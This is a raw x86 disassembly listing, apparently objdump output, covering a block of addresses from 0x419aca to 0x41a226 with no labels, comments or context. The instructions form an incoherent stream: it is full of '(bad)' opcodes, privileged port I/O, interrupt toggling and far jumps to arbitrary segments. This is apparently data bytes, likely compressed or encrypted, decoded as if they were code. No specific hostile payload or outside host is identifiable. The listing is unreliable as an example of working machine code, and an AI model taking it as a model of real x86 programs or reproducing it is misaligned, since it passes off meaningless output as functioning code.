  419aca:	push   cs
  419acb:	adc    ecx,DWORD PTR [eax+edx*4-0xdd50bea]
  419ad2:	mov    al,ds:0xfcc251b6
  419ad7:	inc    esi
  419ad8:	and    eax,esi
  419ada:	xlat   BYTE PTR ds:[ebx]
  419adb:	popa   
  419adc:	cdq    
  419add:	sbb    al,0x74
  419adf:	ins    DWORD PTR es:[edi],dx
  419ae0:	dec    edi
  419ae1:	std    
  419ae2:	shl    BYTE PTR [eax+0x5a208462],0x8c
  419ae9:	test   BYTE PTR [edi-0x28495c7f],dh
  419aef:	jp     0x419aea
  419af1:	(bad)  
  419af2:	jne    0x419acc
  419af4:	retf   
  419af5:	xlat   BYTE PTR ds:[ebx]
  419af6:	and    DWORD PTR [ebx-0x3a],edx
  419af9:	mov    ecx,0xf1d7e3c
  419afe:	mov    gs,WORD PTR [esi+0x4acea14c]
  419b04:	xchg   ebx,eax
  419b05:	sub    eax,0x6f4f644
  419b0a:	sbb    BYTE PTR [edx+0x1362190b],dh
  419b10:	inc    edx
  419b11:	mov    ch,0xa0
  419b13:	fxch   st(3)
  419b15:	add    al,BYTE PTR [ecx+0x2eb1bce9]
  419b1b:	mov    cl,dl
  419b1d:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419b1f:	loop   0x419b2a
  419b21:	push   ds
  419b22:	sub    eax,0x3f876525
  419b27:	mov    ch,al
  419b29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b2a:	sahf   
  419b2b:	stos   DWORD PTR es:[edi],eax
  419b2c:	lods   al,BYTE PTR ds:[esi]
  419b2d:	out    0x2f,al
  419b2f:	shr    BYTE PTR [edi],0xb1
  419b32:	das    
  419b33:	push   edi
  419b34:	imul   bx,dx,0x1cf
  419b39:	shr    BYTE PTR [eax],0xb1
  419b3c:	jno    0x419b17
  419b3e:	pop    edx
  419b3f:	stos   DWORD PTR es:[edi],eax
  419b40:	dec    eax
  419b41:	mov    bl,0xc8
  419b43:	jecxz  0x419bad
  419b45:	js     0x419b34
  419b47:	ret    0xf5ff
  419b4a:	ds jb  0x419b9e
  419b4d:	stos   BYTE PTR es:[edi],al
  419b4e:	xchg   edi,eax
  419b4f:	cmp    edi,ebp
  419b51:	mov    WORD PTR [ebx+0x1e666e90],ds
  419b57:	out    dx,eax
  419b58:	push   esi
  419b59:	(bad)  
  419b5b:	bound  edi,QWORD PTR [esi-0x3a65729e]
  419b61:	add    al,0x15
  419b63:	popf   
  419b64:	outs   dx,DWORD PTR ds:[esi]
  419b65:	pusha  
  419b66:	js     0x419bd8
  419b68:	das    
  419b69:	loope  0x419b8e
  419b6b:	ja     0x419b47
  419b6d:	addr16 jl 0x419b13
  419b70:	mov    WORD PTR [esp+edx*2],fs
  419b73:	xchg   edx,eax
  419b74:	push   0x7
  419b76:	cli    
  419b77:	cmp    DWORD PTR [ebx+0x4fead79f],esp
  419b7d:	mov    WORD PTR [ecx-0x6e],ds
  419b80:	sbb    al,0x63
  419b82:	cmp    eax,0xca51453f
  419b87:	mov    ds:0xe8db8b85,al
  419b8c:	xlat   BYTE PTR ds:[ebx]
  419b8d:	cmp    esp,ebx
  419b8f:	clc    
  419b90:	and    esi,DWORD PTR [ebx+eiz*1+0x50]
  419b94:	retf   0x6a1e
  419b97:	jp     0x419b50
  419b99:	mov    bl,0x8c
  419b9b:	test   BYTE PTR [ecx],dh
  419b9d:	das    
  419b9e:	jbe    0x419bab
  419ba0:	mov    fs,ebp
  419ba2:	sbb    eax,ebp
  419ba4:	sub    cl,BYTE PTR [esi+0x2c]
  419ba7:	jnp    0x419b3b
  419ba9:	sbb    eax,0x2ac278a2
  419bae:	sti    
  419baf:	mov    bl,0xa0
  419bb1:	repz jge 0x419c23
  419bb4:	mov    esp,esi
  419bb6:	adc    BYTE PTR [bp-0x7799],ch
  419bbb:	jp     0x419b64
  419bbd:	xor    DWORD PTR [ebx+0x19],esi
  419bc0:	(bad)  
  419bc2:	nop
  419bc3:	inc    esi
  419bc4:	push   ss
  419bc5:	inc    edi
  419bc6:	sub    DWORD PTR [ebx-0x31],eax
  419bc9:	enter  0xb7b9,0xa2
  419bcd:	fldpi  
  419bcf:	sbb    eax,0x789bf78e
  419bd4:	not    BYTE PTR [eax+0x10]
  419bd7:	add    edi,DWORD PTR [ebx]
  419bd9:	in     al,0x36
  419bdb:	mov    ds:0xb880878b,eax
  419be0:	push   ss
  419be1:	sti    
  419be2:	in     eax,dx
  419be3:	or     eax,0x39f1df5e
  419be8:	push   ss
  419be9:	jmp    0x2765:0xed2d701
  419bf0:	and    al,0x39
  419bf2:	imul   esp,DWORD PTR [ebp+0x4a],0x56
  419bf6:	or     eax,0xe6cab74b
  419bfb:	stos   BYTE PTR es:[edi],al
  419bfc:	lahf   
  419bfd:	adc    eax,ebp
  419bff:	jb     0x419bc1
  419c01:	lahf   
  419c02:	or     DWORD PTR [ecx-0x25],esi
  419c05:	add    esi,DWORD PTR [ebx+esi*4+0x7bb8fa2a]
  419c0c:	scas   eax,DWORD PTR es:[edi]
  419c0d:	stos   DWORD PTR es:[edi],eax
  419c0e:	mov    ah,0x75
  419c10:	mov    edx,0x44d52da0
  419c15:	xor    ebp,DWORD PTR [esp+eax*8-0x55]
  419c19:	cmp    BYTE PTR [eax],bl
  419c1b:	inc    BYTE PTR [ebx+0x5ea82075]
  419c21:	imul   ebp,DWORD PTR [ebp-0x3b7e436b],0xffffff85
  419c28:	fidiv  WORD PTR [ebx-0x1]
  419c2b:	out    dx,al
  419c2c:	jl     0x419c74
  419c2e:	adc    eax,0x1c7a0e71
  419c33:	mov    WORD PTR [ebp+0xaa2619b],?
  419c39:	ror    BYTE PTR [esi+eax*4],cl
  419c3c:	push   0xffffff8a
  419c3e:	sub    esi,0xffffffa3
  419c41:	xor    al,0xc9
  419c43:	jmp    0x1976:0xc49e2705
  419c4a:	mov    esi,0x4811d536
  419c4f:	push   ds
  419c50:	and    dh,ch
  419c52:	xchg   esi,eax
  419c53:	fcomp  DWORD PTR [edx]
  419c55:	inc    edx
  419c56:	clc    
  419c57:	into   
  419c58:	and    dh,dh
  419c5a:	std    
  419c5b:	push   ecx
  419c5c:	or     al,0x1c
  419c5e:	addr16 inc esp
  419c60:	mov    dh,0x8c
  419c62:	outs   dx,BYTE PTR ds:[esi]
  419c63:	sbb    BYTE PTR [esi-0x1d],bl
  419c66:	ret    0x346c
  419c69:	icebp  
  419c6a:	jbe    0x419c76
  419c6c:	inc    eax
  419c6d:	dec    ebp
  419c6e:	inc    edx
  419c6f:	pop    ds
  419c70:	enter  0x6e85,0xe9
  419c74:	jne    0x419c2c
  419c76:	mov    ah,0x17
  419c78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419c79:	out    0xcd,eax
  419c7b:	or     bl,BYTE PTR [edi]
  419c7d:	and    eax,0x2b41075e
  419c82:	jecxz  0x419cbf
  419c84:	test   DWORD PTR [edx+0x43],ebp
  419c87:	por    mm6,QWORD PTR [edx-0x14]
  419c8b:	(bad)  
  419c8c:	loopne 0x419cba
  419c8e:	jo     0x419c30
  419c90:	dec    eax
  419c91:	pop    esi
  419c92:	es icebp 
  419c94:	retf   0x6f87
  419c97:	xchg   ecx,eax
  419c98:	js     0x419ce8
  419c9a:	dec    eax
  419c9b:	dec    esi
  419c9c:	imul   eax,DWORD PTR [edi],0x62ce06d3
  419ca2:	cmp    DWORD PTR [ecx],0x22
  419ca5:	mul    BYTE PTR [ecx]
  419ca7:	inc    esp
  419ca8:	repz xchg ecx,eax
  419caa:	xor    edx,DWORD PTR [edx+edi*1]
  419cad:	cdq    
  419cae:	xchg   esi,eax
  419caf:	loop   0x419c55
  419cb1:	and    bl,BYTE PTR [eax-0x7642cfd4]
  419cb7:	ja     0x419c93
  419cb9:	fidivr WORD PTR [ebx]
  419cbb:	ins    DWORD PTR es:[edi],dx
  419cbc:	mov    cl,0x10
  419cbe:	jg     0x419cb5
  419cc0:	pop    ecx
  419cc1:	add    dl,BYTE PTR ds:0x908f1215
  419cc7:	cld    
  419cc8:	mov    bh,0x94
  419cca:	f2xm1  
  419ccc:	mov    dh,0xa9
  419cce:	and    al,cl
  419cd0:	mov    dl,0xf9
  419cd2:	sahf   
  419cd3:	inc    edi
  419cd4:	mov    al,0xa2
  419cd6:	out    dx,eax
  419cd7:	add    al,0x3f
  419cd9:	sbb    eax,0xd31fe67e
  419cde:	int3   
  419cdf:	int3   
  419ce0:	mov    ebp,0x1ab36d01
  419ce5:	js     0x419d41
  419ce7:	xchg   bl,cl
  419ce9:	repnz test BYTE PTR ss:[ecx],bl
  419ced:	add    eax,0x69908f8b
  419cf2:	scas   eax,DWORD PTR es:[edi]
  419cf3:	stos   BYTE PTR es:[edi],al
  419cf4:	adc    al,0xac
  419cf6:	mov    ebp,0xcc2072b8
  419cfb:	popa   
  419cfc:	mov    esp,0xa2f34df8
  419d01:	outs   dx,BYTE PTR ds:[esi]
  419d02:	push   cs
  419d03:	and    ecx,esi
  419d05:	aad    0x52
  419d07:	cli    
  419d08:	xlat   BYTE PTR ds:[ebx]
  419d09:	ret    0x50d8
  419d0c:	pop    esi
  419d0d:	jae    0x419caa
  419d0f:	dec    ebx
  419d10:	inc    edi
  419d11:	sahf   
  419d12:	arpl   di,di
  419d14:	mov    BYTE PTR [esi+0x20f08405],dh
  419d1a:	adc    al,0x7
  419d1c:	push   DWORD PTR [ecx+eax*2-0x59e54980]
  419d23:	std    
  419d24:	sbb    DWORD PTR [esi-0x573bed9d],esi
  419d2a:	pop    esp
  419d2b:	cmp    DWORD PTR [ebx],ecx
  419d2d:	call   0x7fd0:0x15eb7bad
  419d34:	xchg   edx,ebp
  419d36:	cmp    ebp,edx
  419d38:	mov    eax,0x5abf58b6
  419d3d:	(bad)  
  419d3e:	add    DWORD PTR [ecx+ecx*1+0x2332613a],ecx
  419d45:	and    DWORD PTR [ebp-0x7206183a],0x65b0f9e7
  419d4f:	imul   ecx,DWORD PTR [edx+0x4c16cffb],0xffffffc3
  419d56:	popa   
  419d57:	inc    ebp
  419d58:	call   0x1c751224
  419d5d:	fld    TBYTE PTR [edx-0x5e]
  419d60:	js     0x419ce6
  419d62:	popa   
  419d63:	cmp    BYTE PTR [ebx-0x1d3c63d5],0x42
  419d6a:	lahf   
  419d6b:	jecxz  0x419d7e
  419d6d:	or     esi,DWORD PTR [ecx+0x46]
  419d70:	cmp    ch,BYTE PTR [eax-0x77]
  419d73:	xlat   BYTE PTR ds:[ebx]
  419d74:	hlt    
  419d75:	cmp    eax,0x14eff48
  419d7a:	fsub   st,st(3)
  419d7c:	sub    dh,BYTE PTR [ebp+0x5f]
  419d7f:	out    0xc7,eax
  419d81:	scas   al,BYTE PTR es:[edi]
  419d82:	rcl    BYTE PTR ss:[edi],cl
  419d85:	xchg   esp,eax
  419d86:	arpl   WORD PTR [edi],bx
  419d88:	jge    0x419d46
  419d8a:	cwde   
  419d8b:	jecxz  0x419d52
  419d8d:	mov    bl,0x66
  419d8f:	cmc    
  419d90:	loopne 0x419d8e
  419d92:	mov    dl,0xd4
  419d94:	dec    DWORD PTR [ebp+0x5fcb69e1]
  419d9a:	or     al,0xdb
  419d9c:	pop    esi
  419d9d:	es pop esi
  419d9f:	add    DWORD PTR [esi],0x23b02105
  419da5:	pop    ebp
  419da6:	fidivr WORD PTR [ecx]
  419da8:	mov    dh,0xa5
  419daa:	add    ebx,DWORD PTR [ecx]
  419dac:	lods   eax,DWORD PTR ds:[esi]
  419dad:	xchg   esi,eax
  419dae:	mov    dl,0xbf
  419db0:	dec    ecx
  419db1:	fild   WORD PTR fs:[ebx-0x6f]
  419db5:	in     eax,0x44
  419db7:	(bad)  
  419db9:	pop    ecx
  419dba:	mov    bl,0xb6
  419dbc:	std    
  419dbd:	cli    
  419dbe:	fstp   DWORD PTR [ebp-0x223488f6]
  419dc4:	and    al,0x54
  419dc6:	jnp    0x419ddb
  419dc8:	enter  0x3a26,0x9e
  419dcc:	cwde   
  419dcd:	outs   dx,DWORD PTR ds:[esi]
  419dce:	nop
  419dcf:	scas   al,BYTE PTR es:[edi]
  419dd0:	sbb    DWORD PTR [ecx-0x7e2d3dfd],edx
  419dd6:	pop    ss
  419dd7:	or     DWORD PTR [ebx],edx
  419dd9:	jp     0x419d63
  419ddb:	pop    edi
  419ddc:	push   ebp
  419ddd:	sbb    BYTE PTR [esi],cl
  419ddf:	dec    ebp
  419de0:	jbe    0x419e2b
  419de2:	adc    ecx,DWORD PTR [edi+0xd]
  419de5:	cmc    
  419de6:	not    DWORD PTR [edi]
  419de8:	out    0xe6,al
  419dea:	out    dx,eax
  419deb:	idiv   DWORD PTR [esi+edi*8-0x6d5c8bbc]
  419df2:	xor    bl,cl
  419df4:	mov    eax,0xfd57f5ac
  419df9:	mov    esp,0x5cb42a98
  419dfe:	sti    
  419dff:	(bad)  
  419e00:	xor    esp,ebx
  419e02:	sti    
  419e03:	mov    ecx,0x8c02e0be
  419e08:	dec    ebp
  419e09:	xor    al,0x25
  419e0b:	pop    edx
  419e0c:	inc    edx
  419e0d:	jb     0x419e6e
  419e0f:	ss push 0xe758b04c
  419e15:	inc    ebx
  419e16:	in     eax,0x30
  419e18:	repz rcl BYTE PTR [ebp+0x56],cl
  419e1c:	mov    WORD PTR ds:0xeb389ce,ss
  419e22:	xor    dh,BYTE PTR [eax]
  419e24:	bound  edi,QWORD PTR [ebx]
  419e26:	popa   
  419e27:	ja     0x419e89
  419e29:	aas    
  419e2a:	mov    cl,0x8d
  419e2c:	xchg   esp,ecx
  419e2e:	and    ebx,esp
  419e30:	dec    esp
  419e31:	mov    ah,0x40
  419e33:	sti    
  419e34:	mov    edx,ebx
  419e36:	fmul   DWORD PTR [esi-0x78]
  419e39:	lds    esp,FWORD PTR [esi+eiz*2]
  419e3c:	js     0x419e87
  419e3e:	fst    DWORD PTR [edi]
  419e40:	push   0x7b
  419e42:	rol    BYTE PTR [eax],0xaa
  419e45:	inc    ecx
  419e46:	mov    esi,DWORD PTR [ebx-0x2c]
  419e49:	retf   
  419e4a:	sbb    DWORD PTR [eax+0x6d],0xc252414d
  419e51:	and    ch,bh
  419e53:	dec    ebp
  419e54:	fs pop edx
  419e56:	imul   ebp,DWORD PTR ds:0xc2bbc8de,0xd815595f
  419e60:	xor    eax,0xb1f584fe
  419e65:	push   es
  419e66:	cli    
  419e67:	outs   dx,DWORD PTR ds:[esi]
  419e68:	or     eax,0x87f3570b
  419e6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e6f:	out    0xf1,eax
  419e71:	xor    al,0xd6
  419e73:	inc    eax
  419e74:	push   0x4f
  419e76:	lahf   
  419e77:	inc    esi
  419e78:	add    dh,ch
  419e7a:	jbe    0x419e76
  419e7c:	mov    esi,0xd96f1e62
  419e81:	mov    dl,0xcb
  419e83:	sbb    al,bl
  419e85:	xor    edx,DWORD PTR [edx-0x302382e6]
  419e8b:	jge    0x419e35
  419e8d:	sbb    BYTE PTR [ebp+0x2],dl
  419e90:	push   0x2e6fc9fa
  419e95:	bound  edx,QWORD PTR [edx]
  419e97:	cmp    BYTE PTR [ecx+0x3a],dl
  419e9a:	aaa    
  419e9b:	push   0xc0ee9d6c
  419ea0:	iret   
  419ea1:	repz pushf 
  419ea3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419ea4:	push   ebx
  419ea5:	icebp  
  419ea6:	pop    ebx
  419ea7:	call   0xfcd0:0xeb1b9641
  419eae:	pop    esi
  419eaf:	sti    
  419eb0:	jne    0x419ee0
  419eb2:	and    al,0x88
  419eb4:	xor    edi,ebx
  419eb6:	pop    esi
  419eb7:	push   esp
  419eb8:	fild   QWORD PTR fs:[eax-0x747425ab]
  419ebf:	cdq    
  419ec0:	sbb    eax,ebx
  419ec2:	(bad)  [ebp-0x53]
  419ec5:	inc    edi
  419ec6:	lods   al,BYTE PTR ds:[esi]
  419ec7:	jne    0x419ecc
  419ec9:	mov    ds:0xcd066f6,al
  419ece:	ss ret 0xd20a
  419ed2:	imul   esi,DWORD PTR [esi+0xf],0x66682a67
  419ed9:	lods   eax,DWORD PTR ds:[esi]
  419eda:	jge    0x419f46
  419edc:	inc    esi
  419edd:	pop    ss
  419ede:	cwde   
  419edf:	or     edi,ecx
  419ee1:	repnz test eax,0x43884301
  419ee7:	in     al,0x90
  419ee9:	scas   eax,DWORD PTR es:[edi]
  419eea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419eeb:	mov    dl,0x22
  419eed:	inc    ecx
  419eee:	(bad)  
  419eef:	and    ecx,ecx
  419ef1:	mov    WORD PTR [eax+edx*8+0x6a],fs
  419ef5:	xor    DWORD PTR [edx+ecx*8],ecx
  419ef8:	sti    
  419ef9:	ror    BYTE PTR [ebx+0x24],1
  419efc:	inc    edi
  419efd:	or     cl,bl
  419eff:	cmp    eax,DWORD PTR [ecx-0x6b]
  419f02:	mov    dl,0x86
  419f04:	shl    DWORD PTR [eax],cl
  419f06:	out    0xd3,eax
  419f08:	dec    ecx
  419f09:	stos   DWORD PTR es:[edi],eax
  419f0a:	adc    eax,0xe517bd35
  419f0f:	sub    dl,BYTE PTR [ecx-0x53bc6944]
  419f15:	sahf   
  419f16:	into   
  419f17:	adc    ebx,esi
  419f19:	lahf   
  419f1a:	dec    ecx
  419f1b:	sub    BYTE PTR [ecx-0x15b38891],dl
  419f21:	add    al,0x12
  419f23:	lea    ecx,[eax]
  419f25:	dec    edi
  419f26:	pushf  
  419f27:	call   0x7bdb:0x92a363d6
  419f2e:	add    DWORD PTR [edi-0x6aebf062],ebx
  419f34:	nop
  419f35:	aas    
  419f36:	dec    esi
  419f37:	add    edi,DWORD PTR [esi+0x54]
  419f3a:	xchg   edx,eax
  419f3b:	xor    DWORD PTR [eax+ecx*4],0x51
  419f3f:	scas   eax,DWORD PTR es:[edi]
  419f40:	out    dx,al
  419f41:	mov    DWORD PTR ss:[ebx],edx
  419f44:	inc    ecx
  419f45:	imul   edi,DWORD PTR [esi+0x5c4f8a85],0xffffffd0
  419f4c:	add    eax,DWORD PTR [esi]
  419f4e:	pop    esp
  419f4f:	xor    BYTE PTR [ecx-0x2],dh
  419f52:	(bad)  
  419f54:	cmp    dl,dl
  419f56:	sbb    BYTE PTR [esi-0x39],dl
  419f59:	stos   DWORD PTR es:[edi],eax
  419f5a:	cmp    al,0x3d
  419f5c:	(bad)  
  419f5d:	or     eax,DWORD PTR [ecx-0xed9c8d]
  419f63:	sub    BYTE PTR [edi],0x77
  419f66:	dec    ecx
  419f67:	xor    DWORD PTR [eax+0x6f],0xffffffa7
  419f6b:	sub    al,0xd7
  419f6d:	in     al,0x8f
  419f6f:	xchg   edx,edi
  419f71:	jmp    0x419f9c
  419f73:	xchg   esp,eax
  419f74:	cli    
  419f75:	push   ds
  419f76:	xor    eax,DWORD PTR [edi+0x62]
  419f79:	fsub   DWORD PTR [eax+0x1a]
  419f7c:	pop    ebx
  419f7d:	das    
  419f7e:	lds    esp,FWORD PTR [esi*8+0x4e1d9d98]
  419f85:	jmp    0xb445dcd6
  419f8a:	xor    BYTE PTR [edi+0x3c],bl
  419f8d:	loopne 0x419f1e
  419f8f:	int3   
  419f90:	cmp    eax,0xb96c4704
  419f95:	pop    ds
  419f96:	cmp    al,0xd5
  419f98:	(bad)  [ecx+0x12]
  419f9b:	xor    eax,0x5b361280
  419fa0:	cld    
  419fa1:	push   eax
  419fa2:	stos   BYTE PTR es:[edi],al
  419fa3:	aaa    
  419fa4:	jne    0x419f27
  419fa6:	or     cl,BYTE PTR gs:[ebx-0x16]
  419faa:	mov    ch,0x14
  419fac:	add    esp,DWORD PTR [edi]
  419fae:	add    BYTE PTR [esi],ch
  419fb0:	mov    cl,0x84
  419fb2:	inc    ebx
  419fb3:	and    eax,0x9fca6d6f
  419fb8:	cmp    BYTE PTR [esi],ch
  419fba:	cmp    BYTE PTR [edx],ch
  419fbc:	scas   al,BYTE PTR es:[edi]
  419fbd:	stc    
  419fbe:	mov    BYTE PTR [ecx+0x75],bl
  419fc1:	push   ds
  419fc2:	icebp  
  419fc3:	ja     0x419f9e
  419fc5:	test   eax,0xfad1f06a
  419fca:	fisub  DWORD PTR [edi]
  419fcc:	fadd   QWORD PTR [ebx+0x42]
  419fcf:	les    ecx,FWORD PTR [edx]
  419fd1:	mov    al,BYTE PTR [esi+0x12324d55]
  419fd7:	repnz cmp DWORD PTR [eax],0xffffffcc
  419fdb:	mov    ebp,DWORD PTR [edx+0x69]
  419fde:	pop    es
  419fdf:	mov    edx,0xf4c8e5dc
  419fe4:	pop    ds
  419fe5:	imul   ebx,ebx,0xebb52fca
  419feb:	xchg   ebp,eax
  419fec:	xchg   esp,eax
  419fed:	add    BYTE PTR [esi+0x18],0xf7
  419ff1:	rcl    BYTE PTR [esi-0x63],1
  419ff4:	fnstsw WORD PTR [eax]
  419ff6:	int    0xfd
  419ff8:	iret   
  419ff9:	aas    
  419ffa:	neg    BYTE PTR [ebp-0x221dc25c]
  41a000:	imul   eax,DWORD PTR gs:[ecx+0x76],0x426f0582
  41a008:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a009:	mov    ch,0x85
  41a00b:	scas   al,BYTE PTR es:[edi]
  41a00c:	sbb    DWORD PTR [edx+eiz*1-0x42],edi
  41a010:	stos   BYTE PTR es:[edi],al
  41a011:	fcmovnu st,st(6)
  41a013:	push   0xcf0d2062
  41a018:	sub    ah,al
  41a01a:	sub    ebx,esi
  41a01c:	lods   eax,DWORD PTR ds:[esi]
  41a01d:	test   eax,0x9070372b
  41a022:	push   ds
  41a023:	and    al,0xdc
  41a025:	daa    
  41a026:	fnstenv [edx+0x77fd103e]
  41a02c:	bound  ebp,QWORD PTR ds:0xca73bcb7
  41a032:	pop    ecx
  41a033:	cmp    eax,0x8aaafd90
  41a038:	retf   0xc613
  41a03b:	dec    esi
  41a03c:	out    0x5c,al
  41a03e:	sub    BYTE PTR [edx],bl
  41a040:	icebp  
  41a041:	pop    ecx
  41a042:	mov    al,ds:0x24ccb6f1
  41a047:	out    0xc5,al
  41a049:	sti    
  41a04a:	xlat   BYTE PTR ds:[ebx]
  41a04b:	and    ch,ah
  41a04d:	lds    ebp,FWORD PTR [ebx]
  41a04f:	xchg   edx,eax
  41a050:	xor    ebp,esp
  41a052:	loope  0x41a0ba
  41a054:	jne    0x41a0bf
  41a056:	idiv   BYTE PTR [ecx+0x29]
  41a059:	mov    cl,0x64
  41a05b:	xchg   ebx,eax
  41a05c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a05d:	retf   0x7ec3
  41a060:	lods   al,BYTE PTR ds:[esi]
  41a061:	push   0x9f7181c1
  41a066:	lods   al,BYTE PTR ds:[esi]
  41a067:	mov    DWORD PTR ds:0x6f18a033,ebp
  41a06d:	outs   dx,BYTE PTR ds:[esi]
  41a06e:	sub    BYTE PTR [edx+0x363ae24c],dh
  41a074:	or     DWORD PTR [ebx-0x57],0xffffff97
  41a078:	test   ebx,ebx
  41a07a:	fisub  DWORD PTR cs:[bp-0x68]
  41a07f:	fcom   DWORD PTR [esi+0x44188ea1]
  41a085:	sti    
  41a086:	loopne 0x41a070
  41a088:	pop    edi
  41a089:	clc    
  41a08a:	aad    0xf0
  41a08c:	mov    ds:0x55455178,al
  41a091:	xor    ch,bh
  41a093:	arpl   WORD PTR [esi-0x47],si
  41a096:	shl    bl,1
  41a098:	neg    BYTE PTR [edi]
  41a09a:	fimul  WORD PTR [edx+esi*2+0x66]
  41a09e:	xchg   BYTE PTR [edx-0x69],al
  41a0a1:	into   
  41a0a2:	xchg   BYTE PTR [edi+0x2368ef10],bl
  41a0a8:	inc    eax
  41a0a9:	xor    ah,dh
  41a0ab:	gs jno 0x41a052
  41a0ae:	adc    dh,ah
  41a0b0:	adc    DWORD PTR [edi+ebp*1+0x10],esi
  41a0b4:	cmp    DWORD PTR [eax],ecx
  41a0b6:	test   eax,0xa7fd5ac1
  41a0bb:	push   es
  41a0bc:	push   ebp
  41a0bd:	std    
  41a0be:	and    DWORD PTR [esi+0x5e9f4c7f],ebp
  41a0c4:	fcom   DWORD PTR [edi]
  41a0c6:	iret   
  41a0c7:	loope  0x41a063
  41a0c9:	pop    ebp
  41a0ca:	inc    edx
  41a0cb:	adc    eax,0xc9f1fb15
  41a0d0:	mov    eax,0x43b33fed
  41a0d5:	js     0x41a0d3
  41a0d7:	jns    0x41a096
  41a0d9:	ret    0xb7a
  41a0dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a0dd:	enterw 0x8067,0x32
  41a0e2:	cli    
  41a0e3:	push   edx
  41a0e4:	dec    esp
  41a0e5:	and    bh,al
  41a0e7:	pushf  
  41a0e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a0e9:	inc    edi
  41a0ea:	pop    ds
  41a0eb:	sbb    eax,0x8f2c848b
  41a0f0:	loope  0x41a0fc
  41a0f2:	fimul  DWORD PTR [ebp-0x2a]
  41a0f5:	mov    al,ds:0x86b739cf
  41a0fa:	jo     0x41a07d
  41a0fc:	jbe    0x41a0d5
  41a0fe:	ror    DWORD PTR [edi],1
  41a100:	mov    dl,0x46
  41a102:	jno    0x41a0bf
  41a104:	mov    esi,ss
  41a106:	pop    ds
  41a107:	xchg   ecx,eax
  41a108:	stos   DWORD PTR es:[edi],eax
  41a109:	adc    DWORD PTR [esi],esi
  41a10b:	pushf  
  41a10c:	add    al,0xb1
  41a10e:	add    ah,BYTE PTR [edx-0x9]
  41a111:	rcl    BYTE PTR [eax+0x10],0x11
  41a115:	outs   dx,DWORD PTR ds:[esi]
  41a116:	mov    eax,ds:0x1d2e4099
  41a11b:	sbb    dh,dh
  41a11d:	push   ds
  41a11e:	jp     0x41a136
  41a120:	js     0x41a17b
  41a122:	add    ah,dh
  41a124:	cmp    DWORD PTR [ebp+0x4e],ecx
  41a127:	retf   
  41a128:	cmp    DWORD PTR [ebp-0x1a],ebp
  41a12b:	xor    DWORD PTR es:[ebx+0x2a3d8fea],eax
  41a132:	jge    0x41a0b8
  41a134:	or     dh,BYTE PTR [ebp-0x5c]
  41a137:	shl    DWORD PTR [esi-0x19bf57f7],cl
  41a13d:	fs rcl edi,0x9c
  41a141:	jl     0x41a13f
  41a143:	dec    edx
  41a144:	sbb    ah,BYTE PTR [ecx+0x2f519ef9]
  41a14a:	dec    esi
  41a14b:	jg     0x41a1a0
  41a14d:	ror    bl,1
  41a14f:	jge    0x41a15a
  41a151:	sub    eax,0xcb40efe
  41a156:	(bad)  
  41a157:	xor    ch,BYTE PTR [esi-0x7d30cb5a]
  41a15d:	xchg   edi,eax
  41a15e:	or     ebx,DWORD PTR [ecx+0x61061c01]
  41a164:	add    DWORD PTR [esi-0x59],eax
  41a167:	lahf   
  41a168:	mul    BYTE PTR [edx+0x534f07a]
  41a16e:	mov    WORD PTR ds:[ecx],es
  41a171:	dec    edi
  41a172:	retf   0x4155
  41a175:	ror    BYTE PTR [ebx],1
  41a177:	icebp  
  41a178:	in     eax,0xb9
  41a17a:	addr16 mov ebx,0xfdef34f7
  41a180:	jmp    0xbfe104f4
  41a185:	scas   al,BYTE PTR es:[edi]
  41a186:	call   0x89b0:0xfa1433d3
  41a18d:	jl     0x41a203
  41a18f:	and    DWORD PTR [edx+0x30],ecx
  41a192:	(bad)  
  41a193:	jmp    0x7a59a21c
  41a198:	and    edx,eax
  41a19a:	stos   DWORD PTR es:[edi],eax
  41a19b:	addr16 inc ecx
  41a19d:	xchg   ebp,eax
  41a19e:	fwait
  41a19f:	xchg   DWORD PTR [edi-0x29875e4a],ecx
  41a1a5:	push   eax
  41a1a6:	out    0x8c,eax
  41a1a8:	ret    0x4743
  41a1ab:	jno    0x41a137
  41a1ad:	int    0x2c
  41a1af:	cmp    eax,0x9850d35f
  41a1b4:	rcl    edi,cl
  41a1b6:	and    bh,BYTE PTR [edi]
  41a1b8:	jge    0x41a1f1
  41a1ba:	fnstsw WORD PTR [ecx+0x26]
  41a1bd:	ss gs sbb esi,ebp
  41a1c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1c2:	fs jl  0x41a15f
  41a1c5:	mov    edi,esp
  41a1c7:	ss and eax,0x8836f450
  41a1cd:	xor    ebx,ecx
  41a1cf:	mov    edi,DWORD PTR [edx+0x1f2a8882]
  41a1d5:	dec    esi
  41a1d6:	mov    ebx,0x63ef5638
  41a1db:	dec    esi
  41a1dc:	xor    esp,DWORD PTR [edx-0x51903831]
  41a1e2:	add    DWORD PTR [esi+0x6a],edx
  41a1e5:	ss call 0x85fb7512
  41a1eb:	test   eax,0xda2c91bd
  41a1f0:	xor    edx,DWORD PTR [ebx-0x22ea7264]
  41a1f6:	mov    bl,0x8f
  41a1f8:	push   esp
  41a1f9:	cmc    
  41a1fa:	xor    ecx,esp
  41a1fc:	inc    esi
  41a1fd:	inc    ecx
  41a1fe:	push   edx
  41a1ff:	push   esi
  41a200:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a201:	push   ecx
  41a202:	mov    ecx,0xd7bd956f
  41a207:	div    BYTE PTR [esi-0x1bb035ab]
  41a20d:	ins    BYTE PTR es:[edi],dx
  41a20e:	rcr    esi,1
  41a210:	stos   BYTE PTR es:[edi],al
  41a211:	push   es
  41a212:	xchg   ebp,eax
  41a213:	pop    edx
  41a214:	rcl    BYTE PTR [ebx+eax*1-0x8d9b924],0xc9
  41a21c:	add    DWORD PTR [ebx-0x7b],eax
  41a21f:	or     ah,BYTE PTR [ebx-0x58cd47e0]
  41a225:	xchg   ebp,eax
  41a226:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
